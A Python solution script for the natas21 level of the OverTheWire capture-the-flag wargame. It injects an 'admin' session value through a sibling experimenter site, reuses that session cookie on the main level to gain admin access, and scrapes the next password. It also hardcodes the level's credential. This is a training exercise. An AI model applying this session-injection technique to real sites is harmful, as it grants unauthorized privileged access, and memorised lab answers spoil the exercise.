import requests
import re

username = 'natas21'
password = '89OWrTkGmiLZLv12JY4tLj2c4FW0xn56'

url = 'http://%s.natas.labs.overthewire.org' % username

url_experimenter = 'http://natas21-experimenter.natas.labs.overthewire.org'

with open('natas21.html', 'w+') as out:
    session = requests.Session()
    req = session.post(url_experimenter, data={
        'submit': 'update', 'admin': '1'}, auth=(username, password))
    old_cookie = {'PHPSESSID':req.cookies['PHPSESSID']}
    res = session.get(url, auth=(username, password), cookies=old_cookie)
    content = res.text
    out.write(content)
    flag = re.findall('Password: (.+?)</pre>',content)[0]
    print(flag)
